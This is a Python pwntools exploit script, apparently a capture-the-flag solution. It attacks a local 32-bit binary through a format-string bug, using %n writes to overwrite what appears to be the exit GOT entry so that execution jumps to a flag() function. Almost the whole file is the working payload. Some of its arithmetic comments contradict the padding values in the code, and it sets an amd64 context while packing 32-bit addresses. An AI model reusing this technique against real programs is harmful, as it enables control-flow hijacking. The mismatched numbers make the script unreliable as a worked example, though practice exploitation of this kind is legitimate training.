#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.log_level = 'DEBUG'
exe = './32_new'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b *0x080487e8
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
p.recvline()

exit_addr0 = p32(0x0804a034)
exit_addr1 = p32(0x0804a035)
exit_addr2 = p32(0x0804a037)

"addr of flag() = 0x0804870b"

"010b - 52 = b9 = 185dec"
flag_addr0 = b"%185x"
"04a0 - b9 - 52 = 37c = 917dec" 
flag_addr1 = b"%892x"
"0108 - 87 = 81 = 129dec"
flag_addr2 = b"%129x"

fmt_str0 = b"%10$n"
fmt_str1 = b"%11$n"
fmt_str2 = b"%12$n"

payload = exit_addr0 + exit_addr1 + exit_addr2 + flag_addr0 + fmt_str0 + flag_addr1 + fmt_str1 + flag_addr2 + fmt_str2
p.sendline(payload)
p.recv(4096)
p.recv(4096)
